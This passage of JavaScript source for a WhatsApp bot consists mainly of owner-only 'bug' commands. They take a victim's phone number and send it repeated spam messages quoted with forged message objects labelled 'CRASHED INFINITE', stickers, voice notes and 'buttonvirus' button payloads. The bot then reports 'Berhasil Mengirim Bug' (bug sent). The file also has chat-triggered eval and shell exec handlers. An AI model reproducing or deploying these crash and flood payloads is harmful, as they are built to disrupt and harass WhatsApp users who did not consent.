            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            break
          case 'momo': {            
          if (!isCreator) return
             momoe = `
///....▓▓▓▓
///..▓▓......▓
///..▓▓......▓▓..................▓▓▓▓
///..▓▓......▓▓..............▓▓......▓▓▓▓
///..▓▓....▓▓..............▓......▓▓......▓▓
///....▓▓....▓............▓....▓▓....▓▓▓....▓▓
///......▓▓....▓........▓....▓▓..........▓▓....▓
///........▓▓..▓▓....▓▓..▓▓................▓▓
///........▓▓......▓▓....▓▓
///.......▓......................▓
///.....▓.........................▓
///....▓......^..........^......▓
///....▓...........❤...........▓
///....▓..........................▓
///.....▓..........ٮ..........▓
///.........▓▓..........▓▓
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await hisoka.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            }
            break
          case 'momoto': { 
          if (!isCreator) return
          if (!text) throw `Nomernya mana?` 
             momoe = `
///....▓▓▓▓
///..▓▓......▓
///..▓▓......▓▓..................▓▓▓▓
///..▓▓......▓▓..............▓▓......▓▓▓▓
///..▓▓....▓▓..............▓......▓▓......▓▓
///....▓▓....▓............▓....▓▓....▓▓▓....▓▓
///......▓▓....▓........▓....▓▓..........▓▓....▓
///........▓▓..▓▓....▓▓..▓▓................▓▓
///........▓▓......▓▓....▓▓
///.......▓......................▓
///.....▓.........................▓
///....▓......^..........^......▓
///....▓...........❤...........▓
///....▓..........................▓
///.....▓..........ٮ..........▓
///.........▓▓..........▓▓
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            }
            break
          case 'gasmomo': {            
          if (!isCreator) return
           if (!text) throw `Nomernya mana?`       
             momoe = `
///....▓▓▓▓
///..▓▓......▓
///..▓▓......▓▓..................▓▓▓▓
///..▓▓......▓▓..............▓▓......▓▓▓▓
///..▓▓....▓▓..............▓......▓▓......▓▓
///....▓▓....▓............▓....▓▓....▓▓▓....▓▓
///......▓▓....▓........▓....▓▓..........▓▓....▓
///........▓▓..▓▓....▓▓..▓▓................▓▓
///........▓▓......▓▓....▓▓
///.......▓......................▓
///.....▓.........................▓
///....▓......^..........^......▓
///....▓...........❤...........▓
///....▓..........................▓
///.....▓..........ٮ..........▓
///.........▓▓..........▓▓
`

             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await hisoka.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            }
            break

case 'butto':
                    if (!isCreator) return
                    if (!text) throw `Nomernya mana?`
                 buttonspc = [
                          {buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: jobot}, type: 1},
  {buttonId: 'babaabbabababa', buttonText: {displayText: buttonvirus}, type: 1},
  {buttonId: 'babababbababa', buttonText: {displayText: jobot}, type: 1}
]
                      
                    buttonMessagepc = {
                          text: "JOMBLO",
                          footerText: 'JONES',
                          buttons: buttonspc,
                          headerType: 1
                      }
                      hisoka.sendMessage(`${text}@s.whatsapp.net`, buttonMessagepc)
                      freply(`succes`)
                    break
case 'stikto':{
if (!isCreator) return
if (!text) throw `Nomernya mana?`
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `kontol`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
 hey = fs.readFileSync('./faraxx/anjas.webp')
hisoka.sendImageAsSticker(`${text}@s.whatsapp.net`, hey, adehvn, { packname: global.packname, author: global.author })
await freply(`Berhasil Mengirim Bug Di Nomer ${text}@s.whatsapp.net`)
}
break
case 'vnto':{
if (!isCreator) return
if (!text) throw `Nomernya mana?`
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `kontol`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
 hey = fs.readFileSync('chan.mp3')
 hisoka.sendMessage(`${text}@s.whatsapp.net`, {audio: hey, mimetype: 'audio/mpeg', ptt:true }, {quoted: adehvn})
await freply(`Berhasil Mengirim Bug Di Nomer ${text}@s.whatsapp.net`)
}
break
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return freply(mess.owner)
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                            if (sat == undefined) {
                                bang = util.format(sul)
                            }
                            return freply(bang)
                    }
                    try {
                        freply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        freply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return freply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await freply(evaled)
                    } catch (err) {
                        await freply(String(err))
                    }
                }

                if (budy.startsWith('$')) {
                    if (!isCreator) return freply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return freply(`${err}`)
                        if (stdout) return freply(stdout)
                    })
                }
			
		if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
                    let room = Object.values(db.data.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
                    if (room) {
                        if (/^.*(next|leave|start)/.test(m.text)) return
                        if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
                        let other = [room.a, room.b].find(user => user !== m.sender)
                        m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
                            contextInfo: {
                                ...m.msg.contextInfo,
                                forwardingScore: 0,
                                isForwarded: true,
                                participant: other
                            }
                        } : {})
                    }
                    return !0
                }
			
		if (isCmd && budy.toLowerCase() != undefined) {
		    if (m.chat.endsWith('broadcast')) return
		    if (m.isBaileys) return
		    let msgs = global.db.data.database
		    if (!(budy.toLowerCase() in msgs)) return
		    hisoka.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
		}
        }
        

    } catch (err) {
        m.reply(util.format(err))
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})
